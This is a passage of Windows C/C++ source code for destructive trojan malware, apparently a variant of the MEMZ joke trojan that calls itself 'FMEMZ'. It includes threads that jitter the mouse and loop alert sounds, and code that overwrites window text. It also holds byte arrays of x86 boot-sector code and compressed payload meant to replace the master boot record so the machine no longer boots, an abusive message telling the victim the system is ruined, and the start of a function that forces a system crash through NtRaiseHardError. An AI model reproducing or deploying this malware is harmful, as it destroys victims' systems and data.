		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		//BlockInput(true);
		Sleep(7);
	}
	return(1);
}
DWORD WINAPI craz5(LPVOID lpParam) {
	POINT cursor;
	while (1) {
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		//BlockInput(true);
		Sleep(3);
	}
	return(1);
}
DWORD WINAPI crazymouse(LPVOID lpParam) {
	while (1) {
		HANDLE cr = CreateThread(0, 0, craz1, 0, 0, 0);
    	Sleep(9000);
		TerminateThread(cr, 0);
		CloseHandle(cr);

		HANDLE cr1 = CreateThread(0, 0, craz2, 0, 0, 0);
		Sleep(10000);
		TerminateThread(cr1, 0);
		CloseHandle(cr1);

		HANDLE cr2 = CreateThread(0, 0, craz3, 0, 0, 0);
		Sleep(9000);
		TerminateThread(cr2, 0);
		CloseHandle(cr2);

		HANDLE cr3 = CreateThread(0, 0, craz4, 0, 0, 0);
		Sleep(12000);
		TerminateThread(cr3, 0);
		CloseHandle(cr3);
		HANDLE cr4 = CreateThread(0, 0, craz5, 0, 0, 0);

	}
	return 0;
}
#include <mmsystem.h>
#include <vector>

#pragma comment(lib, "winmm.lib")

DWORD WINAPI soundlast(LPVOID lpParam) {
	HWAVEOUT hwo = NULL;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 65000, 65000, 1, 8, 0 };

	if (waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
		return 1;
	}

	DWORD bufferSize = 65000 * 30;

	char* buffer = (char*)VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buffer) {
		waveOutClose(hwo);
		return 1;
	}

	for (DWORD t = 0; t < bufferSize; t++) {
		buffer[t] = static_cast<char>(t >> 6 ^ t & 37 | t << 1 & (t & 598 ? t >> 4 : t >> 10));
	};

	WAVEHDR hdr = { 0 };
	hdr.lpData = buffer;
	hdr.dwBufferLength = bufferSize;

	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

	while (!(hdr.dwFlags & WHDR_DONE)) {
		Sleep(30000);
	}

	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);

	return 0;
}

DWORD WINAPI memzsound(LPVOID lpParam) {
	while (1) {
		PlaySoundW(L"C:\Windows\Media\Windows Background.wav", NULL, SND_FILENAME | SND_ASYNC);
		Sleep(500);
		MessageBeep(MB_ICONERROR);
		Sleep(500);
		MessageBeep(MB_ICONERROR);
		MessageBeep(MB_ICONWARNING);
		Sleep(500);
		PlaySoundW(L"C:\Windows\Media\Windows Background.wav", NULL, SND_FILENAME | SND_ASYNC);
		Sleep(500);
		MessageBeep(MB_ICONWARNING);
		Sleep(500);
		MessageBeep(MB_ICONWARNING);
		Sleep(500);
		PlaySoundW(L"C:\Windows\Media\Windows Background.wav", NULL, SND_FILENAME | SND_ASYNC);
		Sleep(500);
		MessageBeep(MB_ICONERROR);
		Sleep(500);
		MessageBeep(MB_ICONWARNING);
		Sleep(500);
		MessageBeep(MB_ICONERROR);
		Sleep(50);
		MessageBeep(MB_ICONWARNING);
		Sleep(50);
		PlaySoundW(L"C:\Windows\Media\Windows Background.wav", NULL, SND_FILENAME | SND_ASYNC);
		Sleep(50);
		MessageBeep(MB_ICONWARNING);
		Sleep(50);
		PlaySoundW(L"C:\Windows\Media\Windows Background.wav", NULL, SND_FILENAME | SND_ASYNC);
		Sleep(500);
	}
	return 0;
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {

	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)generateRandomUnicodeString(rand() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);
	return true;

}
#ifndef CLEAN
const unsigned char code1[] = {
	0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x04, 0x02, 0xB9, 0x02,
	0x00, 0xB6, 0x00, 0xBB, 0x00, 0x00, 0xCD, 0x13, 0x31, 0xC0, 0x89, 0xC3,
	0x89, 0xC1, 0x89, 0xC2, 0xBE, 0x00, 0x00, 0xBF, 0x00, 0x40, 0xAC, 0x81,
	0xFE, 0x9E, 0x07, 0x73, 0x35, 0x3C, 0x80, 0x73, 0x03, 0xE9, 0x10, 0x00,
	0x24, 0x7F, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9, 0x80, 0xF9, 0xFF, 0x75,
	0xF7, 0xE9, 0xE2, 0xFF, 0x88, 0xC4, 0xAC, 0x89, 0xC3, 0xAC, 0x89, 0xF2,
	0x89, 0xDE, 0x81, 0xC6, 0x00, 0x40, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9,
	0x80, 0xF9, 0x00, 0x75, 0xF7, 0x89, 0xD6, 0xE9, 0xC4, 0xFF, 0xB0, 0xB6,
	0xE6, 0x43, 0xB8, 0x03, 0x10, 0xB3, 0x00, 0xCD, 0x10, 0xBF, 0x00, 0x00,
	0xBA, 0xC0, 0x9D, 0xB9, 0x00, 0xB8, 0x8E, 0xC1, 0xB8, 0x00, 0x00, 0xB9,
	0xD0, 0x07, 0xF3, 0xAB, 0xBE, 0x9C, 0x9F, 0xBF, 0x00, 0x00, 0xE4, 0x61,
	0x0C, 0x03, 0xE6, 0x61, 0xB3, 0x01, 0x52, 0xB4, 0x86, 0xB9, 0x00, 0x00,
	0xBA, 0x00, 0x60, 0xCD, 0x15, 0x5A, 0x81, 0xFE, 0xE8, 0x9F, 0x7D, 0x04,
	0xAC, 0xB4, 0xF0, 0xAB, 0xFE, 0xCB, 0x80, 0xFB, 0x00, 0x75, 0xE3, 0x56,
	0x89, 0xD6, 0xAD, 0x89, 0xC1, 0x80, 0xE4, 0x1F, 0xE6, 0x42, 0x88, 0xE0,
	0xE6, 0x42, 0xC0, 0xED, 0x05, 0xC0, 0xE5, 0x02, 0x88, 0xEB, 0x89, 0xF2,
	0x5E, 0x81, 0xFA, 0xF4, 0x9D, 0x75, 0xC3, 0xBE, 0x00, 0x40, 0xBF, 0x00,
	0x00, 0xB8, 0xE0, 0x07, 0x8E, 0xD8, 0xB8, 0x00, 0xB8, 0x8E, 0xC0, 0xFE,
	0xCB, 0xE9, 0x20, 0x00, 0xB0, 0xDC, 0xAA, 0xAC, 0xAA, 0x81, 0xFE, 0xC0,
	0x9D, 0x74, 0x42, 0x81, 0xFF, 0xA0, 0x0F, 0x74, 0x03, 0xE9, 0xEC, 0xFF,
	0x52, 0xB4, 0x86, 0xB9, 0x01, 0x00, 0xBA, 0x00, 0x60, 0xCD, 0x15, 0x5A,
	0xBF, 0x00, 0x00, 0x81, 0xFA, 0x9C, 0x9F, 0x75, 0x03, 0xBA, 0xF4, 0x9D,
	0xFE, 0xCB, 0x80, 0xFB, 0x00, 0x75, 0xCD, 0x56, 0x89, 0xD6, 0xAD, 0x89,
	0xC1, 0x80, 0xE4, 0x1F, 0xE6, 0x42, 0x88, 0xE0, 0xE6, 0x42, 0xC0, 0xED,
	0x05, 0x88, 0xEB, 0x89, 0xF2, 0x5E, 0xE9, 0xB3, 0xFF, 0xBE, 0x00, 0x40,
	0xE9, 0xC1, 0xFF
};

const unsigned char code2[] = {
	0x55, 0xAA, 0x83, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x08, 0x00, 0x00, 0x10, 0x00, 0x00, 0x20, 0x00, 0x35, 0x0B, 0x83, 0xF1,
	0xF1, 0x11, 0xF1, 0x00, 0x00, 0x4B, 0x00, 0x96, 0x04, 0x80, 0xFF, 0x00,
	0x4F, 0x4F, 0x00, 0x9F, 0x4F, 0x00, 0xEA, 0x53, 0x82, 0x1F, 0xF1, 0x1F,
	0x01, 0x42, 0x4E, 0x00, 0x4E, 0x50, 0x02, 0x12, 0x1F, 0x83, 0x10, 0x10,
	0x10, 0x10, 0x02, 0x50, 0x04, 0x02, 0x50, 0x08, 0x80, 0x10, 0x02, 0x31,
	0x1F, 0x83, 0x14, 0x14, 0x14, 0x14, 0x02, 0x80, 0x04, 0x83, 0x44, 0x44,
	0x44, 0x44, 0x02, 0x88, 0x04, 0x02, 0x80, 0x0E, 0x87, 0x40, 0x0E, 0xEE,
	0xEE, 0xED, 0xED, 0xED, 0xED, 0x02, 0xA2, 0x04, 0x02, 0xA5, 0x05, 0x82,
	0xEE, 0xEE, 0x0E, 0x02, 0x60, 0x1E, 0x02, 0x88, 0x08, 0x83, 0x46, 0x46,
	0x46, 0x46, 0x02, 0xD8, 0x04, 0x02, 0xD0, 0x0E, 0x8C, 0x00, 0xEE, 0xED,
	0xDD, 0xDC, 0xDD, 0xDD, 0xDD, 0xDD, 0xCD, 0xDD, 0xDD, 0xCD, 0x02, 0xF3,
	0x04, 0x83, 0xDD, 0xED, 0xEE, 0x00, 0x02, 0xB3, 0x1D, 0x83, 0x66, 0x66,
	0x66, 0x66, 0x03, 0x20, 0x04, 0x03, 0x20, 0x08, 0x03, 0x22, 0x0E, 0x81,
	0x00, 0xEE, 0x02, 0xFB, 0x05, 0x03, 0x41, 0x04, 0x83, 0xD0, 0x07, 0x07,
	0xD0, 0x02, 0xF9, 0x04, 0x84, 0xEE, 0x00, 0x10, 0x07, 0x07, 0x02, 0xB2,
	0x1A, 0x83, 0x6E, 0x6E, 0x6E, 0x6E, 0x03, 0x70, 0x04, 0x83, 0xEE, 0xEE,
	0xEE, 0xEE, 0x03, 0x78, 0x04, 0x03, 0x70, 0x08, 0x85, 0x00, 0x07, 0x07,
	0x00, 0xE0, 0xEE, 0x03, 0x3E, 0x08, 0x8F, 0xCD, 0xDD, 0xDD, 0x00, 0x77,
	0x77, 0x77, 0x07, 0xD0, 0xD0, 0xD0, 0xE0, 0x07, 0x77, 0x77, 0x77, 0x03,
	0x02, 0x1A, 0x03, 0x78, 0x08, 0x83, 0xEA, 0xEA, 0xEA, 0xEA, 0x03, 0xC8,
	0x04, 0x03, 0xC0, 0x08, 0x85, 0x0A, 0x00, 0x70, 0x77, 0x07, 0x00, 0x03,
	0x8E, 0x05, 0x02, 0xFA, 0x04, 0x81, 0xDC, 0xD0, 0x03, 0xA2, 0x04, 0x80,
	0x77, 0x03, 0xEA, 0x04, 0x03, 0xEE, 0x04, 0x03, 0x55, 0x1A, 0x83, 0xAA,
	0xAA, 0xAA, 0xAA, 0x04, 0x10, 0x04, 0x04, 0x10, 0x08, 0x04, 0x16, 0x0A,
	0x85, 0x0A, 0x00, 0x70, 0x70, 0x00, 0xEE, 0x02, 0xF9, 0x07, 0x03, 0x98,
	0x05, 0x80, 0xF0, 0x04, 0x38, 0x04, 0x80, 0x70, 0x04, 0x3B, 0x05, 0x03,
	0xA6, 0x19, 0x83, 0xA3, 0xA3, 0xA3, 0xA3, 0x04, 0x60, 0x04, 0x83, 0x33,
	0x33, 0x33, 0x33, 0x04, 0x68, 0x04, 0x04, 0x60, 0x0D, 0x83, 0x03, 0x00,
	0xEE, 0xDE, 0x02, 0xF1, 0x04, 0x03, 0x96, 0x07, 0x81, 0x77, 0x70, 0x04,
	0x3F, 0x04, 0x04, 0x8C, 0x04, 0x04, 0x46, 0x1A, 0x04, 0x68, 0x08, 0x87,
	0x39, 0x39, 0x39, 0x39, 0xF9, 0x39, 0x39, 0x39, 0x04, 0xB0, 0x0C, 0x9A,
	0x39, 0x30, 0x00, 0xE0, 0xEE, 0xEE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE,
	0xDE, 0x0E, 0x70, 0x77, 0x77, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
	0x77, 0x70, 0x01, 0x03, 0xA7, 0x19, 0x83, 0x99, 0x99, 0x99, 0x99, 0x05,
	0x00, 0x04, 0x81, 0x99, 0x9F, 0x05, 0x04, 0x06, 0x05, 0x00, 0x09, 0x88,
	0x99, 0x99, 0x99, 0x00, 0x77, 0x77, 0x70, 0x00, 0x01, 0x03, 0x88, 0x04,
	0x83, 0x01, 0x01, 0x01, 0x01, 0x05, 0x21, 0x06, 0x05, 0x2B, 0x05, 0x03,
	0x05, 0x1B, 0x83, 0x91, 0x91, 0x91, 0x91, 0x05, 0x50, 0x04, 0x05, 0x48,
	0x10, 0x05, 0x5C, 0x04, 0x05, 0x27, 0x04, 0x05, 0x6A, 0x05, 0x05, 0x59,
	0x07, 0x05, 0x6D, 0x07, 0x01, 0xB8, 0x98, 0x00, 0x9F, 0xF1, 0x06, 0x99,
	0x73, 0x05, 0xAC, 0x93, 0x07, 0x7F, 0x06, 0x07, 0x7F, 0x4B, 0x82, 0xF1,
	0x11, 0x1F, 0x05, 0xAB, 0xFF, 0x08, 0xAA, 0xBB, 0x02, 0x50, 0xF9, 0x03,
	0x48, 0x05, 0x03, 0x4E, 0x05, 0x80, 0x11, 0x03, 0x53, 0x1C, 0x03, 0x70,
	0x18, 0x84, 0xEE, 0xE0, 0xE0, 0xEE, 0xEE, 0x03, 0x8D, 0x0C, 0x03, 0x98,
	0x08, 0x81, 0xE0, 0x00, 0x03, 0xA2, 0x1D, 0x03, 0xC0, 0x18, 0x04, 0x44,
	0x04, 0x81, 0xE0, 0xE0, 0x03, 0xDE, 0x0A, 0x80, 0xDD, 0x03, 0xE8, 0x27,
	0x04, 0x11, 0x1A, 0x83, 0x70, 0x70, 0x77, 0x77, 0x04, 0x2E, 0x0A, 0x04,
	0x37, 0x28, 0x04, 0x60, 0x1C, 0x80, 0x03, 0x04, 0x7D, 0x0B, 0x04, 0x87,
	0x28, 0x04, 0xC0, 0x0D, 0x04, 0xBD, 0x10, 0x80, 0x39, 0x04, 0xCE, 0x0B,
	0x04, 0xD8, 0x27, 0x05, 0x10, 0x0C, 0x0C, 0xD0, 0x0C, 0x05, 0x17, 0x08,
	0x05, 0x20, 0x0B, 0x05, 0x2A, 0x25, 0x05, 0x62, 0x06, 0x80, 0xF1, 0x05,
	0x57, 0x15, 0x05, 0x71, 0x07, 0x05, 0x72, 0x11, 0x05, 0x82, 0x2A, 0x05,
	0xAD, 0xFF, 0x06, 0xB1, 0xFF, 0x07, 0xB5, 0xAE, 0x81, 0x11, 0x11, 0x01,
	0x92, 0x4F, 0x00, 0xDC, 0xB5, 0x0E, 0xFC, 0x9C, 0x00, 0x4B, 0x54, 0x0A,
	0x59, 0x15, 0x12, 0x25, 0x0A, 0x84, 0x10, 0x0E, 0x0E, 0x0E, 0x0E, 0x12,
	0x40, 0x04, 0x12, 0x40, 0x08, 0x0A, 0x81, 0x1F, 0x80, 0x11, 0x0A, 0xA9,
	0x15, 0x12, 0x75, 0x09, 0x83, 0x00, 0xEE, 0xEE, 0xED, 0x0C, 0x04, 0x05,
	0x80, 0xDC, 0x0B, 0xB5, 0x04, 0x0A, 0xCD, 0x05, 0x0A, 0xD1, 0x41, 0x0C,
	0x01, 0x08, 0x82, 0xDD, 0xD0, 0xD0, 0x12, 0x99, 0x04, 0x12, 0xA1, 0x04,
	0x0A, 0x2F, 0x1B, 0x0B, 0x49, 0x10, 0x13, 0x10, 0x0E, 0x0B, 0x5E, 0x08,
	0x12, 0x9A, 0x04, 0x80, 0x00, 0x0B, 0x6C, 0x04, 0x03, 0x4F, 0x06, 0x0B,
	0x75, 0x1B, 0x0B, 0x99, 0x0F, 0x0B, 0x98, 0x0F, 0x13, 0x2E, 0x05, 0x12,
	0x9A, 0x05, 0x0C, 0x57, 0x07, 0x0C, 0xB1, 0x05, 0x0B, 0x74, 0x1C, 0x04,
	0x10, 0x1A, 0x82, 0xA0, 0xA0, 0xA0, 0x03, 0xDD, 0x04, 0x13, 0x83, 0x06,
	0x80, 0xCD, 0x13, 0x89, 0x05, 0x80, 0x7F, 0x0C, 0x64, 0x04, 0x13, 0xDB,
	0x06, 0x0C, 0x68, 0x1F, 0x0C, 0x30, 0x11, 0x0B, 0x72, 0x04, 0x04, 0x2C,
	0x05, 0x13, 0x32, 0x0B, 0x80, 0x77, 0x13, 0x91, 0x05, 0x80, 0x07, 0x14,
	0x2C, 0x05, 0x13, 0xE8, 0x18, 0x0C, 0x89, 0x15, 0x14, 0x55, 0x04, 0x88,
	0x03, 0x03, 0x03, 0x03, 0x33, 0x00, 0xEE, 0xEE, 0xDE, 0x12, 0xE2, 0x07,
	0x80, 0x0D, 0x0C, 0x64, 0x05, 0x81, 0x70, 0x70, 0x04, 0x2B, 0x04, 0x80,
	0x77, 0x0C, 0xB5, 0x1A, 0x05, 0x0E, 0x0E, 0x0C, 0xDD, 0x11, 0x84, 0x07,
	0xE0, 0xE0, 0xE0, 0xE0, 0x14, 0xC0, 0x04, 0x87, 0xE0, 0xE0, 0xE0, 0x00,
	0x70, 0x70, 0x70, 0x70, 0x14, 0xCC, 0x04, 0x80, 0x70, 0x04, 0xE5, 0x1B,
	0x81, 0xF1, 0x1F, 0x11, 0xCF, 0x05, 0x05, 0x50, 0x17, 0x80, 0x00, 0x14,
	0xD4, 0x04, 0x82, 0x01, 0x70, 0x70, 0x14, 0x38, 0x07, 0x15, 0x13, 0x05,
	0x15, 0x13, 0x0A, 0x05, 0xAD, 0xFF, 0x0F, 0xE2, 0xE7, 0x0F, 0xD9, 0x93,
	0x05, 0xAC, 0xFF, 0x16, 0x23, 0xA0, 0x17, 0xA5, 0x04, 0x08, 0x18, 0x4D,
	0x08, 0x14, 0x5B, 0x12, 0x20, 0xFF, 0x13, 0x1F, 0xAD, 0x81, 0x07, 0x07,
	0x13, 0xCE, 0x4A, 0x83, 0xA0, 0x07, 0x77, 0x70, 0x14, 0x1C, 0x4C, 0x84,
	0x03, 0x70, 0x70, 0x03, 0x33, 0x14, 0x6D, 0x34, 0x14, 0xA2, 0x1C, 0x81,
	0x90, 0x07, 0x14, 0xBF, 0x31, 0x05, 0x49, 0x1D, 0x15, 0x0E, 0xFF, 0x18,
	0x97, 0xFF, 0x08, 0x15, 0x94, 0x14, 0xF0, 0x07, 0x05, 0xAD, 0xFF, 0x16,
	0x2D, 0xFF, 0x20, 0x84, 0x4C, 0x0A, 0x50, 0x1E, 0x81, 0x44, 0x40, 0x1A,
	0x10, 0x30, 0x0A, 0xA0, 0x20, 0x1A, 0x60, 0x5A, 0x81, 0xD0, 0xD0, 0x22,
	0x38, 0x05, 0x0B, 0x21, 0x04, 0x21, 0xF1, 0x1B, 0x0B, 0x40, 0x19, 0x1B,
	0x49, 0x0A, 0x22, 0x34, 0x06, 0x1B, 0x0A, 0x07, 0x81, 0xDD, 0xEE, 0x14,
	0x18, 0x04, 0x03, 0xA6, 0x31, 0x81, 0xE0, 0x07, 0x03, 0x89, 0x04, 0x0B,
	0xAD, 0x06, 0x1B, 0xA1, 0x06, 0x1B, 0x5A, 0x26, 0x1B, 0x7F, 0x18, 0x81,
	0x0A, 0x0A, 0x1C, 0xA2, 0x04, 0x1B, 0x9D, 0x0B, 0x1B, 0xA9, 0x27, 0x0C,
	0x2F, 0x21, 0x22, 0xD1, 0x0B, 0x1B, 0xFC, 0x24, 0x0C, 0x7F, 0x1E, 0x80,
	0x30, 0x1C, 0x3E, 0x0A, 0x1C, 0x49, 0x27, 0x1C, 0x6F, 0x1C, 0x80, 0x90,
	0x23, 0x18, 0x06, 0x1C, 0x93, 0x2E, 0x05, 0x50, 0x1B, 0x15, 0x0E, 0xFF,
	0x10, 0xD9, 0xF8, 0x80, 0xF1, 0x26, 0x50, 0x4D, 0x00, 0x9E, 0x47, 0x82,
	0xF1, 0xF1, 0x1F, 0x26, 0xA2, 0x4E, 0x05, 0xAB, 0xFF, 0x06, 0xE0, 0xFF,
	0x21, 0xB6, 0xD3, 0x03, 0x49, 0x05, 0x22, 0x8E, 0x05, 0x03, 0x53, 0x35,
	0x0B, 0x58, 0x0E, 0x23, 0xC5, 0x08, 0x03, 0x9E, 0x3A, 0x0B, 0xA8, 0x0B,
	0x2A, 0x0A, 0x05, 0x03, 0xE8, 0x41, 0x0B, 0xF9, 0x08, 0x23, 0x71, 0x0B,
	0x04, 0x3C, 0x40, 0x23, 0xBC, 0x10, 0x04, 0x8C, 0x30, 0x23, 0xFC, 0x1C,
	0x24, 0x17, 0x05, 0x0C, 0xAE, 0x22, 0x80, 0x1F, 0x24, 0x40, 0x1D, 0x80,
	0x77, 0x24, 0x5E, 0x0C, 0x86, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0C, 0xF4, 0x04, 0x29, 0x0C, 0x1B, 0x24, 0x90, 0x20, 0x2C, 0x7B, 0x05,
	0x2C, 0x6B, 0x05, 0x24, 0xAB, 0x0F, 0x00, 0x38, 0xFF, 0x2D, 0x19, 0x7F,
	0x2C, 0xFF, 0x4E, 0x27, 0x37, 0x98, 0x26, 0x9D, 0x9A, 0x05, 0xAD, 0xFF,
	0x25, 0xF5, 0x5A, 0x1F, 0x6F, 0x40, 0x0A, 0x20, 0x30, 0x19, 0xF0, 0x1E,
	0x80, 0x10, 0x0A, 0x6F, 0x31, 0x1A, 0x40, 0x20, 0x02, 0xF0, 0x80, 0x1A,
	0xE0, 0x18, 0x0D, 0x01, 0x04, 0x80, 0x60, 0x1A, 0xFD, 0x09, 0x03, 0x96,
	0x2A, 0x1B, 0x30, 0x18, 0x80, 0x0E, 0x03, 0xD9, 0x87, 0x1B, 0xD0, 0x18,
	0x33, 0x4A, 0x05, 0x04, 0x7D, 0x33, 0x14, 0x50, 0x19, 0x33, 0x9B, 0x04,
	0x04, 0xCD, 0x29, 0x30, 0xA1, 0x0A, 0x0C, 0xD1, 0x1F, 0x05, 0x1F, 0x25,
	0x1E, 0x89, 0x13, 0x2C, 0x60, 0x15, 0x05, 0x6C, 0x27, 0x08, 0x12, 0xFF,
	0x30, 0x33, 0xFD, 0x07, 0xBE, 0xFF, 0x2D, 0x1A, 0xFF, 0x2E, 0x19, 0x93,
	0x31, 0x36, 0x0B, 0x80, 0xF0, 0x31, 0x3C, 0xED, 0x0B, 0x19, 0x27, 0x1A,
	0xE0, 0x19, 0x81, 0x60, 0x60, 0x1A, 0xFB, 0x0B, 0x0B, 0x66, 0x2A, 0x32,
	0xA0, 0x18, 0x0B, 0xA8, 0x88, 0x33, 0x40, 0x1C, 0x0C, 0x4C, 0x34, 0x33,
	0x90, 0x1D, 0x80, 0x33, 0x0C, 0x9E, 0x1F, 0x35, 0xE0, 0x13, 0x0C, 0xD0,
	0x50, 0x24, 0x89, 0x1D, 0x0D, 0x3D, 0x1D, 0x0F, 0xD9, 0xFF, 0x06, 0xBC,
	0xFF, 0x0F, 0x88, 0xFF, 0x10, 0x84, 0xFF, 0x26, 0x54, 0xCA, 0x21, 0xC0,
	0xCA, 0x1A, 0xBA, 0x26, 0x22, 0xB0, 0x29, 0x1B, 0x09, 0x27, 0x2A, 0xD0,
	0x18, 0x42, 0x4A, 0x06, 0x13, 0x7E, 0x82, 0x2B, 0x70, 0x18, 0x14, 0x18,
	0x38, 0x2B, 0xC0, 0x19, 0x84, 0x09, 0x09, 0x09, 0x09, 0x39, 0x1C, 0x3E,
	0x4F, 0x14, 0xBD, 0x33, 0x05, 0x50, 0x1C, 0x24, 0xA9, 0x15, 0x80, 0xF1,
	0x15, 0x22, 0xFF, 0x16, 0x51, 0xFF, 0x17, 0x50, 0xFF, 0x18, 0x4D, 0xFF,
	0x36, 0x7C, 0xD2, 0x41, 0x00, 0xFF, 0x41, 0xFF, 0xAD, 0x1B, 0x9C, 0x34,
	0x42, 0xE0, 0x18, 0x80, 0x30, 0x1B, 0xE9, 0x37, 0x43, 0x30, 0x18, 0x84,
	0x09, 0x70, 0x70, 0x09, 0x39, 0x43, 0x4D, 0x50, 0x1C, 0x8D, 0x33, 0x43,
	0xD0, 0x1D, 0x43, 0xEE, 0x0C, 0x82, 0xF1, 0xF1, 0x1F, 0x24, 0xBA, 0x4F,
	0x46, 0x55, 0xD1, 0x1E, 0x3B, 0xFF, 0x01, 0x5B, 0x37, 0x05, 0xAD, 0xFF,
	0x16, 0x29, 0xFF, 0x4F, 0x30, 0x80, 0x19, 0xF0, 0xCA, 0x22, 0x8A, 0x26,
	0x1A, 0xE0, 0x29, 0x22, 0xD9, 0x27, 0x3A, 0x70, 0x17, 0x23, 0x17, 0x89,
	0x3B, 0x10, 0x20, 0x23, 0xC0, 0x30, 0x33, 0x90, 0x1F, 0x24, 0x0F, 0x81,
	0x4B, 0x99, 0x1B, 0x4B, 0xBD, 0x04, 0x44, 0x01, 0x05, 0x40, 0x84, 0x06,
	0x4B, 0xCC, 0x48, 0x2F, 0x50, 0xD0, 0x3F, 0xE2, 0x9D, 0x40, 0x81, 0x04,
	0x2F, 0x01, 0xFF, 0x05, 0xAD, 0xFF, 0x06, 0xFA, 0xFF, 0x50, 0x80, 0xE9,
	0x2A, 0x59, 0x27, 0x3A, 0x20, 0x26, 0x2A, 0xA6, 0x2A, 0x3A, 0x70, 0x23,
	0x2A, 0xF3, 0x7D, 0x52, 0x80, 0x2C, 0x33, 0x6C, 0x3B, 0x80, 0x3F, 0x52,
	0xE8, 0x10, 0x2B, 0xE8, 0x27, 0x53, 0x1F, 0x16, 0x80, 0xF9, 0x5B, 0x02,
	0x04, 0x2C, 0x2A, 0x35, 0x53, 0x6F, 0x15, 0x80, 0xF1, 0x5B, 0x45, 0x05,
	0x80, 0xF1, 0x2C, 0x7B, 0x31, 0x08, 0x4A, 0xFF, 0x57, 0x90, 0x97, 0x5C,
	0xD1, 0x4F, 0x5D, 0x22, 0x4F, 0x87, 0x7E, 0x27, 0x12, 0x27, 0x4C, 0x46,
	0xB8, 0x44, 0x5D, 0xC0, 0x05, 0x8E, 0x26, 0xB8, 0x24, 0x34, 0x24, 0xBF,
	0x23, 0x34, 0x24, 0x00, 0x25, 0xB8, 0x44, 0x4C, 0x46, 0x5D, 0xC0, 0x08,
	0x5D, 0xD4, 0x05, 0xA0, 0x24, 0x34, 0x24, 0x89, 0x23, 0xBF, 0x23, 0x89,
	0x23, 0x34, 0x24, 0x4C, 0x46, 0x9D, 0x45, 0x7E, 0x27, 0x7E, 0x27, 0x70,
	0x49, 0xF0, 0x27, 0x68, 0x28, 0x70, 0x29, 0x70, 0x69, 0x68, 0x48, 0xF0,
	0x47, 0x5D, 0xFE, 0x06, 0x87, 0x68, 0x28, 0x7E, 0x27, 0x4C, 0x26, 0x9D,
	0x25, 0x5E, 0x12, 0x04, 0x5E, 0x10, 0x04, 0x5E, 0x0E, 0x04, 0x85, 0x70,
	0x29, 0x7E, 0x47, 0x4C, 0x46, 0x5E, 0x16, 0x0C, 0x83, 0xF0, 0x27, 0x7E,
	0x27, 0x5E, 0x0A, 0x08, 0x81, 0xF0, 0x47, 0x5E, 0x0E, 0x08, 0x5E, 0x46,
	0x04, 0x5E, 0x3C, 0x05, 0x84, 0x48, 0x70, 0x49, 0x68, 0x48, 0x5D, 0xF4,
	0x66, 0x85, 0x70, 0x49, 0x99, 0x2C, 0x39, 0x2B, 0x5E, 0xC0, 0x06, 0x5E,
	0xAA, 0x06, 0x83, 0x70, 0x29, 0x12, 0x27, 0x5D, 0xC8, 0x06, 0x81, 0x70,
	0x49, 0x5E, 0xC6, 0x08, 0x81, 0x99, 0x2C, 0x5E, 0xD4, 0x04, 0x5E, 0xB6,
	0x04, 0x87, 0x99, 0x2C, 0xFB, 0x2E, 0x24, 0x2E, 0x99, 0x2C, 0x5E, 0xC0,
	0x0E, 0x5E, 0xCC, 0x08, 0x5F, 0x00, 0x04, 0x5E, 0xF6, 0x04, 0x83, 0x70,
	0x29, 0x00, 0x2A, 0x5F, 0x0C, 0x06, 0x5E, 0xD2, 0x0C, 0x81, 0x00, 0x4A,
	0x5E, 0xC0, 0x6C, 0xBC, 0x68, 0x48, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x63,
	0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x68, 0x61, 0x73, 0x20,
	0x62, 0x65, 0x65, 0x6E, 0x20, 0x74, 0x72, 0x61, 0x73, 0x68, 0x65, 0x64,
	0x20, 0x62, 0x79, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4D, 0x45, 0x4D, 0x5A,
	0x20, 0x74, 0x72, 0x6F, 0x6A, 0x61, 0x6E, 0x2E, 0x20, 0x4E, 0x6F, 0x77,
	0x20, 0x65, 0x6E, 0x6A, 0x6F, 0x5F, 0xBC, 0x06, 0x8A, 0x4E, 0x79, 0x61,
	0x6E, 0x20, 0x43, 0x61, 0x74, 0x2E, 0x2E, 0x2E
};
const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE FMEMZ TROJAN.\r\n\r\nYour computer won't boot up again to windows,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill FMEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D :3";
const size_t msg_len = sizeof(msg);
const size_t code1_len = sizeof(code1);
const size_t code2_len = sizeof(code2);
#endif
extern const char *sites[];
extern const char *sounds[];

extern const size_t nSites;
extern const size_t nSounds;

#ifndef CLEAN
extern const unsigned char code1[];
extern const unsigned char code2[];

extern const size_t code1_len;
extern const size_t code2_len;

extern const unsigned char msg[];
extern const char *msgs[];

extern const size_t msg_len;
extern const size_t nMsgs;
DWORD wb = 0;
#endif
void killWindowsInstant() {
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

